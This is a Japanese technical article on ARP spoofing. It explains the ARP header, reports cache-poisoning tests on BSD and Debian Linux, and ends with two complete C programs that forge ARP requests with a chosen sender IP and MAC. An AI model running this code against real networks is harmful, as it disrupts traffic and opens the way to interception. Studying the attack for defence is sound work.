@@ -1,0 +1,556 @@
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+--- 第○章: ARPスプーフィングについての考察と実装 ---
+
+著者：unya
+
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
+
+
+■0x01.) はじめに
+
+　ARPスプーフィングは古くからから存在しているにも関わらず、いまだに有効な
+攻撃手段です。記憶の新しいところでは、さくらインターネットで2008年6月にAR
+Pスプーフィング攻撃が発覚しました。
+　今回は、ARPスプーフィングについて考察していき、最後に実装方法を掲載しま
+す。幸いなことに、インターネットにはARPスプーフィングについて解説するサイ
+トが数多く存在します。ARPスプーフィングとは何か、ということを理解するため
+には、それらのサイトを参照することをおすすめします。
+　ここでは、具体的なARPスプーフィングについての解説はしません。既存のツー
+ルに頼ることなく、自らARPスプーフィングツールを作成し、実行することを目的
+とした解説をしたいと思います。
+
+
+■0x02.) テスト環境
+
+　以下のオペレーティングシステムを使用してテストを実施しました。
+
+OpenBSD 4.7 amd64
+FreeBSD 8.1 amd64
+NetBSD 5.1 amd64
+Debian GNU/Linux 5.0.7 amd64
+
+
+■0x03.) ARPについて
+
+●3.1 ARPとは
+
+　イーサネットで接続されたネットワーク機器同士が通信するにあたり、フレー
+ムの宛先となるインタフェースを決定するのは48ビットのMACアドレスです。その
+ため、TCP/IPを利用して通信するためには、ネットワーク層で使用する論理アド
+レス（IPアドレス）とデータリンク層で使用する物理アドレス（MACアドレス）を
+マッピングする機能が必要となります。この機能をARP（Address Resolution Pr
+otocol）といいます。
+
+●3.2 ARPキャッシュ
+
+　IPアドレスとMACアドレスとのマッピング（アドレスの解決）がおこなわれると、
+マッピング情報が保持されます。これをARPキャッシュといいます。保持される時
+間は実装と設定に依存します。
+
+●3.3 ARPヘッダーフォーマット
+
+　ARPパケットの構造を理解するために、NetBSDのnet/arp.hから抜粋した構造体
+を例に説明します。
+
+-----
+struct  arphdr {
+        uint16_t ar_hrd;        /* format of hardware address */
+#define ARPHRD_ETHER    1       /* ethernet hardware format */
+#define ARPHRD_IEEE802  6       /* IEEE 802 hardware format */
+#define ARPHRD_ARCNET   7       /* ethernet hardware format */
+#define ARPHRD_FRELAY   15      /* frame relay hardware format */
+#define ARPHRD_STRIP    23      /* Ricochet Starmode Radio hardware format */
+#define ARPHRD_IEEE1394 24      /* IEEE 1394 (FireWire) hardware format */
+        uint16_t ar_pro;        /* format of protocol address */
+        uint8_t  ar_hln;        /* length of hardware address */
+        uint8_t  ar_pln;        /* length of protocol address */
+        uint16_t ar_op;         /* one of: */
+#define ARPOP_REQUEST   1       /* request to resolve address */
+#define ARPOP_REPLY     2       /* response to previous request */
+#define ARPOP_REVREQUEST 3      /* request protocol address given hardware */
+#define ARPOP_REVREPLY  4       /* response giving protocol address */
+#define ARPOP_INVREQUEST 8      /* request to identify peer */
+#define ARPOP_INVREPLY  9       /* response identifying peer */
+/*
+ * The remaining fields are variable in size,
+ * according to the sizes above.
+ */
+#ifdef COMMENT_ONLY
+        uint8_t  ar_sha[];      /* sender hardware address */
+        uint8_t  ar_spa[];      /* sender protocol address */
+        uint8_t  ar_tha[];      /* target hardware address */
+        uint8_t  ar_tpa[];      /* target protocol address */
+#endif
+#define ar_sha(ap) (((char *)((ap)+1))+0)
+#define ar_spa(ap) (((char *)((ap)+1))+(ap)->ar_hln)
+#define ar_tha(ap) \
+        (ntohs((ap)->ar_hrd) == ARPHRD_IEEE1394 \
+                ? NULL : (((char *)((ap)+1))+(ap)->ar_hln+(ap)->ar_pln))
+#define ar_tpa(ap) \
+        (ntohs((ap)->ar_hrd) == ARPHRD_IEEE1394 \
+                ? (((char *)((ap)+1))+(ap)->ar_hln+(ap)->ar_pln) \
+                : (((char *)((ap)+1))+(ap)->ar_hln+(ap)->ar_pln+(ap)->ar_hln))
+} __packed;
+-----
+
+　上記の構造体から、ARPパケットのフォーマットが以下のようになることが分か
+ります。
+
+ 0                   1                   2                   3   
+ 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|             ar_hrd            |            ar_pro             |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+                4
+|     ar_hln    |     ar_pln    |            ar_op              |2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                             ar_sha                                                            |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                             ar_spa                            |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                             ar_tha                                                            |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+|                             ar_tpa                            |
++-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
+
+ar_hrd
+    ハードウェアアドレスの種類。イーサネットであれば1になる。
+ar_pro
+    変換されるプロトコルアドレスの種類。IPv4アドレスは0x0800となる。
+ar_hln
+    ハードウェアアドレスのサイズをバイト単位で指定する。イーサネットで使
+用するアドレスは6バイトになる。
+ar_pln
+    論理アドレスのサイズをバイト単位で指定する。IPv4アドレスは4バイトに
+なる。
+ar_op
+    ARPの動作を指定する。ARPリクエストなら1、リプライなら2、RARPリクエス
+トなら3、RARPリプライならば4となる。
+ar_sha
+    送信元ハードウェアアドレス。ARPを送信するネットワーク機器のMACアドレ
+スとなる。
+ar_spa
+    送信元プロトコルアドレス。ARPを送信するネットワーク機器のIPアドレスが
+入る。
+ar_tha
+    送信先ハードウェアアドレス。このフィールドはリクエストとリプライで値
+が変わる。
+    ARPリクエスト…00:00:00:00:00:00もしくはff:ff:ff:ff:ff:ff
+    ARPリプライ…ARPリクエストを行ったネットワーク機器のハードウェアアド
+レス
+ar_tpa
+    送信先プロトコルアドレス。このフィールドはリクエストとリプライで意味
+が変わる。
+    ARPリクエスト…アドレス解決したいプロトコルアドレス
+    ARPリプライ…ARPリクエストを行ったネットワーク機器のプロトコルアドレス
+
+
+■0x04.) 4. ARPスプーフィングとは
+
+　TCP/IPをイーサネットLAN上で利用するためには、IPアドレスとMACアドレスを
+マッピングする必要があることはすでに説明しました。ARPスプーフィングは、こ
+のマッピング情報（ARPキャッシュ）を汚染します。イーサネットドライバは常に
+MACアドレスを宛先として使用するため、汚染されたマッピング情報をもとにTCP
+/IP通信をおこなうと、正しい送信先へ送信できなくなります。
+
+●4.1 ARPキャッシュの汚染
+
+　ARPキャッシュの各エントリが更新されるタイミングは、ARPリプライを受信し
+た場合のみではありません。ARPキャッシュはARPリクエストを受信した場合でも
+更新されます。
+　以下の表は、FreeBSD 8.1とDebian GNU/Linux 5.0.7に対して条件を変えながら
+ARPスプーフィングをおこなった結果です。
+
+表4.1-1 ARPリクエストによるARPスプーフィング結果
++--------------------------------------------------------------------------------------------------+-------+
+| 送信先MACアドレス | ar_spa（送信元IP） | ar_tpa（送信先IP）| FreeBSD                             | Linux |
++-------------------+--------------------+-------------------+-------------------------------------+-------+
+| ブロードキャスト  | ARPキャッシュに有  | 自分宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
+|-------------------|--------------------|-------------------|-------------------------------------|-------|
+| ブロードキャスト  | ARPキャッシュに有  | 他人宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
+|-------------------|--------------------|-------------------|-------------------------------------|-------|
+| ブロードキャスト  | ARPキャッシュに無  | 自分宛て          | ar_spaをARPキャッシュに追加         | 〃    |
+|-------------------|--------------------|-------------------|-------------------------------------|-------|
+| ブロードキャスト  | ARPキャッシュに無  | 他人宛て          | 無視                                | 〃    |
+|-------------------|--------------------|-------------------|-------------------------------------|-------|
+| ユニキャスト      | ARPキャッシュに有  | 自分宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
+|-------------------|--------------------|-------------------|-------------------------------------|-------|
+| ユニキャスト      | ARPキャッシュに有  | 他人宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
+|-------------------|--------------------|-------------------|-------------------------------------|-------|
+| ユニキャスト      | ARPキャッシュに無  | 自分宛て          | ar_spaをARPキャッシュに追加         | 〃    |
+|-------------------|--------------------|-------------------|-------------------------------------|-------|
+| ユニキャスト      | ARPキャッシュに無  | 他人宛て          | 無視                                | 〃    |
++----------------------------------------------------------------------------------------------------------+
+
+表4.1-2 ARPリプライによるARPスプーフィング結果
++----------------------------------------------------------------------------------------------------------+
+| 送信先MACアドレス | ar_spa（送信元IP） | ar_tpa（送信先IP）| FreeBSD                             | Linux |
++-------------------+--------------------+-------------------+-------------------------------------+-------+
+| ユニキャスト      | ARPキャッシュに有  | 自分宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
+|-------------------|--------------------|-------------------|-------------------------------------|-------|
+| ユニキャスト      | ARPキャッシュに有  | 他人宛て          | ar_spaに該当するARPキャッシュを更新 | 〃    |
+|-------------------|--------------------|-------------------|-------------------------------------|-------|
+| ユニキャスト      | ARPキャッシュに無  | 自分宛て          | ar_spaをARPキャッシュに追加         | 無視  |
+|-------------------|--------------------|-------------------|-------------------------------------|-------|
+| ユニキャスト      | ARPキャッシュに無  | 他人宛て          | 無視                                | 〃    |
++----------------------------------------------------------------------------------------------------------+
+
+　FreeBSDとLinuxの挙動の違いは、ARPリプライによるスプーフィング結果に表れ
+ています。Linuxは自身のARPリクエストに対するリプライのみ受け入れます。
+　次に、FreeBSD以外のBSDの挙動を調べるため、FreeBSDとLinuxで違いの現れた
+パラメーターを使用し、各BSDに対してARPリクエストとARPリプライによるスプー
+フィングを実行しました。
+
+表4.1-3 ARPリクエストによるARPスプーフィング可否
++--------------------------------------+
+| ターゲットOS     | バージョン | 結果 |
++------------------+------------+------+
+| NetBSD           | 5.1        | ○   |
+| FreeBSD          | 8.1        | ○   |
+| OpenBSD          | 4.7        | ○   |
+| Debian GNU/Linux | 5.0.7      | ○   |
++--------------------------------------+
+
+表4.1-4 ARPリプライによるARPスプーフィング可否
++--------------------------------------+
+| ターゲットOS     | バージョン | 結果 |
++------------------+------------+------+
+| NetBSD           | 5.1        | ○   |
+| FreeBSD          | 8.1        | ○   |
+| OpenBSD          | 4.7        | ○   |
+| Debian GNU/Linux | 5.0.7      | ×   |
++--------------------------------------+
+
+　各BSDに挙動の違いは現れておらず、LinuxでのみARPリプライによるARPスプー
+フィングに失敗しています。
+　この結果から、ARPスプーフィングの実行には、送信先MACアドレスにユニキャ
+ストを使用したARPリクエストによる方法が適していると考えます。
+　送信先MACアドレスにユニキャストを使用するのは、ブロードキャストを使用す
+るとブロードキャストドメイン全体に影響を及ぼすためです。
+
+
+■0x05.) ARPスプーフィングの実装
+
+　BSDとLinuxにおけるARPパケット送信のためのサンプルコードを掲載します。
+今回のテストに使用したARPスプーフィングツールは、ぼくのサイトに置いてあり
+ます。
+
+●5.1 BSDコード
+
+-----
+/*
+ * bsdarpsend.c
+ *
+ * BSDでARP送信を行うためのサンプルプログラムです
+ * エラーチェックは省略しています
+ * FreeBSD 8.1 amd64/OpenBSD 4.7 amd64/NetBSD 5.1 amd64でコンパイル・動作の確認をおこないました
+ */
+ 
+#include <sys/ioctl.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#if defined(_METBSD_SOURCE)
+# include <net/ethernet.h>
+#endif
+#include <net/if.h>
+#include <net/bpf.h>
+
+#include <netinet/in.h>
+#include <netinet/if_ether.h>
+
+#include <arpa/inet.h>
+
+#include <err.h>
+#include <string.h>
+#include <netdb.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <stdlib.h>
+#include <stdio.h>
+
+/* 送信に使用するインタフェース	*/
+char *interface = "em0";
+
+/* 送信に使用するデバイス */
+char *bpf = "/dev/bpf0";
+/*
+ * 送信元MACアドレス
+ * ARPスプーフィングをおこなうと、ARPキャッシュにこのMACアドレスが登録されます
+ */
+char *src_mac = "00:00:33:44:55:66";
+/*
+ * 送信元IPアドレス
+ * ARPスプーフィングをおこなうと、ARPキャッシュにこのIPアドレスが登録されます
+ */
+char *src_ip = "192.168.2.2";
+
+/*
+ * 送信先MACアドレス
+ * 送信先に合わせて修正してください
+ * ブロードキャストでARPスプーフィングを実行するとブロードキャストドメイン全体に影響します
+ */
+char *dst_mac = "ff:ff:ff:ff:ff:ff";
+/*
+ * 送信先IPアドレス
+ * ARPリクエストの場合は問い合わせるIPアドレスになります
+ */
+char *dst_ip = "192.168.2.1";
+
+
+int
+resolve(const char *host, struct in_addr *addr)
+{
+  struct hostent *hoste;
+  
+  if (inet_aton(host, addr))
+    return 0;
+  if ((hoste = gethostbyname(host))) {
+    memcpy(addr, hoste->h_addr_list[0], sizeof(struct in_addr));
+      return 1;
+  }
+  return -1;
+}
+
+int
+main(int argc, char *argv[])
+{
+  int sd;
+  int res;
+  struct in_addr src_addr, dst_addr;
+  char arpbuf[sizeof(struct ether_header) + sizeof(struct ether_arp)];
+  struct ether_header *eth;
+  struct ether_arp *arp;
+  struct ifreq ifr;
+
+  /*
+   * 送信に使用するためのBPFデバイスを開く
+   */
+  if ((sd = open(bpf, O_RDWR, 0)) < 0)
+    err(EXIT_FAILURE, "open");
+  /*
+   * /dev/bpfXX とネットワークインタフェースを紐付ける
+   */
+  memset(&ifr, 0, sizeof(struct ifreq));
+  strlcpy(ifr.ifr_name, interface, sizeof(ifr.ifr_name));
+  if (ioctl(sd, BIOCSETIF, &ifr) < 0)
+    err(EXIT_FAILURE, "ioctl");
+
+  /*
+   * ホスト名/IPアドレスをバイナリに変換
+   * エラーチェックは省略しています
+   */
+  resolve(src_ip, &src_addr);
+  resolve(dst_ip, &dst_addr);
+
+  /*
+   * イーサネットヘッダーの作成
+   * ether_aton()のエラーチェックは省略しています
+   */
+  eth = (struct ether_header *)arpbuf;
+  memcpy(eth->ether_dhost, ether_aton(dst_mac), sizeof(eth->ether_dhost));
+  memcpy(eth->ether_shost, ether_aton(src_mac), sizeof(eth->ether_shost));
+  eth->ether_type = htons(ETHERTYPE_ARP);
+
+  /*
+   * ARPヘッダーの作成
+   */
+  arp = (struct ether_arp *)(arpbuf + sizeof(struct ether_header));
+  arp->arp_hrd = htons(ARPHRD_ETHER);    /* ハードウェアアドレスの種類 */
+  arp->arp_pro = htons(ETHERTYPE_IP);    /* 論理アドレスの種類         */
+  arp->arp_hln = ETHER_ADDR_LEN;         /* MACアドレスのサイズ        */
+  arp->arp_pln = sizeof(struct in_addr); /* 論理アドレスのサイズ       */
+  arp->arp_op = htons(ARPOP_REQUEST);    /* ARPリクエスト              */
+  /* ARPペイロード部分 */
+  memcpy(arp->arp_sha, eth->ether_shost, sizeof(arp->arp_sha));
+  memcpy(arp->arp_tha, eth->ether_dhost, sizeof(arp->arp_tha));
+  memcpy(arp->arp_spa, &src_addr, sizeof(arp->arp_spa));
+  memcpy(arp->arp_tpa, &dst_addr, sizeof(arp->arp_tpa));
+
+  res = write(sd, arpbuf, sizeof(arpbuf));
+  if (res < 0)
+    perror("write");
+  else
+    printf("%d bytes send\n", res);
+
+  close(sd);
+
+  return 0;
+}
+-----
+
+●5.2 Linuxコード
+
+-----
+/*
+ * linarpsend.c
+ *
+ * linuxでARP送信をおこなうためのサンプルプログラムです
+ * エラーチェックは省略しています
+ * Debian GNU/Linux 5.0.7 amd64でコンパイル・動作の確認をおこないました
+ */
+
+#include <sys/types.h>
+#include <sys/socket.h>
+
+#include <netinet/in.h>
+#include <netinet/if_ether.h>
+
+#include <err.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <netdb.h>
+
+/* 送信に使用するインタフェース */
+char *interface = "eth0";
+/*
+ * 送信元MACアドレス
+ * ARPスプーフィングをおこなうと、ARPキャッシュにこのMACアドレスが登録されます
+ */
+char *src_mac = "00:00:33:44:55:66";
+/*
+ * 送信元IPアドレス
+ * ARPスプーフィングをおこなうと、ARPキャッシュにこのIPアドレスが登録されます
+ */
+char *src_ip = "192.168.2.2";
+
+/*
+ * 送信先MACアドレス
+ * 送信先に合わせて修正してください
+ * ブロードキャストでARPスプーフィングを実行するとブロードキャストドメイン全体に影響します
+ */
+char *dst_mac = "ff:ff:ff:ff:ff:ff";
+/*
+ * 送信先IPアドレス
+ * ARPリクエストの場合は問い合わせるIPアドレスになります
+ */
+char *dst_ip = "192.168.2.1";
+
+int
+resolve(const char *host, struct in_addr *addr)
+{
+  struct hostent *hoste;
+    
+  if (inet_aton(host, addr))
+    return 0;
+  if ((hoste = gethostbyname(host))) {
+    memcpy(addr, hoste->h_addr_list[0], sizeof(struct in_addr));
+    return 1;
+  }
+  return -1;
+}
+
+int
+main(int argc, char *argv[])
+{
+  int sd;
+  int res;
+  struct in_addr src_addr, dst_addr;
+  char arpbuf[sizeof(struct ether_header) + sizeof(struct ether_arp)];
+  struct ether_header *eth;
+  struct ether_arp *arp;
+  struct sockaddr to;
+  socklen_t tolen = sizeof(struct sockaddr);
+
+  /* 
+   * 古い実装です
+   * 現在はpacket(7)が推奨されています
+   */
+  if ((sd = socket(PF_PACKET, SOCK_PACKET, htons(ETH_P_ALL))) < 0)
+    err(EXIT_FAILURE, "socket");
+
+  /*
+   * ホスト名/IPアドレスをバイナリに変換
+   * エラーチェックは省略しています
+   */
+  resolve(src_ip, &src_addr);
+  resolve(dst_ip, &dst_addr);
+
+  /*
+   * イーサネットヘッダーの作成
+   * ether_aton_r()のエラーチェックは省略しています
+   */
+  eth = (struct ether_header *)arpbuf;
+  ether_aton_r(dst_mac, eth->ether_dhost);
+  ether_aton_r(src_mac, eth->ether_shost);
+  eth->ether_type = htons(ETHERTYPE_ARP);
+
+  /*
+   * ARPヘッダーのパラーメーターはnet/if_arp.hを参照
+   */
+  arp = (struct ether_arp *)(arpbuf + sizeof(struct ether_header));
+  arp->arp_hrd = htons(ARPHRD_ETHER);    /* ハードウェアアドレスの種類 */
+  arp->arp_pro = htons(ETHERTYPE_IP);    /* 論理アドレスの種類         */
+  arp->arp_hln = ETH_ALEN;               /* MACアドレスのサイズ        */
+  arp->arp_pln = sizeof(struct in_addr); /* 論理アドレスのサイズ       */
+  arp->arp_op = htons(ARPOP_REQUEST);    /* ARPリクエスト              */
+  /* ARPペイロード部分 */
+  memcpy(arp->arp_sha, eth->ether_shost, sizeof(arp->arp_sha));
+  memcpy(arp->arp_tha, eth->ether_dhost, sizeof(arp->arp_tha));
+  memcpy(arp->arp_spa, &src_addr, sizeof(arp->arp_spa));
+  memcpy(arp->arp_tpa, &dst_addr, sizeof(arp->arp_tpa));
+
+  memset(&to, 0, sizeof(struct sockaddr));
+  to.sa_family = PF_PACKET;
+  strncpy(to.sa_data, interface, sizeof(to.sa_data)-1);
+
+  res = sendto(sd, arpbuf, sizeof(arpbuf), 0, (struct sockaddr *)&to, tolen);
+  if (res < 0)
+    perror("sendto");
+  else
+    printf("%d bytes send\n", res);
+
+  close(sd);
+
+  return 0;
+}
+-----
+
+●5.3 BSDとLinuxでの実装の違い
+
+　デバイスドライバレベルで生のパケットを送信するにあたり、BSDとLinuxの実
+装の違いは、以下の2点です。
+
+・BSDがBPFを使用するのに対して、Linuxはソケットを使用する。
+・BSDがwrite(2)を使用して送信するのに対して、Linuxはsendto(2)を使用する。
+
+
+■0x06.) 最後に
+
+　ARPスプーフィングは、それ自体では通信妨害を引き起こすのみです。汚染され
+たARPキャッシュを参照して送信先を決定したフレームは、正しい送信先へ向かわ
+ないためです。ARPスプーフィングは、あくまでも本格的な攻撃のための第一歩に
+過ぎません。さくらインターネットではwebサーバーからの応答パケットが改ざん
+（iframeタグの挿入）されました。このような攻撃を成立させるためには、ARPス
+プーフィングやパケットの改ざん以外にも手順が必要となります。それらはARPス
+プーフィングとはまた別のテクニックが必要となり、攻撃内容によっては難易度
+が上がります。
+　詳細な攻撃手順やテクニックについての解説は、また別の機会にとっておくこ
+とにします。
+
+
+■0x07.) 参考文献
+
+[1]「詳解TCP/IP〈Vol.1〉プロトコル」ピアソンエデュケーション
+
+
+■0x08.)  関連URL
+
+[1]ARPを利用したローカルエリアネットワークにおける不正接続の排除
+    http://www.sfc.wide.ad.jp/rg/2004s/term/material/11/2004S_TermProject_macchan_07-29.pdf
+[2]ARPスプーフィングで通信傍受！ | The Weekly Herald
+    http://herald.jugem.jp/?eid=67
+[3][ethna-users:0969] ML保管庫のページに変なiframeが埋め込まれている件に
+ついて
+    http://ml.ethna.jp/pipermail/users/2008-June/000968.html
+[4]データセンタ内のARP spoofing攻撃で通信改ざんが発生、対策の定石は? - ス
+ラッシュドット・ジャパン
+    http://slashdot.jp/security/article.pl?sid=08/06/05/008238
+[5]［ARPスプーフィング］他のマシンあての通信を乗っ取り，監視強化が先決 -
+ ぜい弱性に揺らぐインターネット：ITpro
+    http://itpro.nikkeibp.co.jp/article/COLUMN/20090225/325452/
+
+
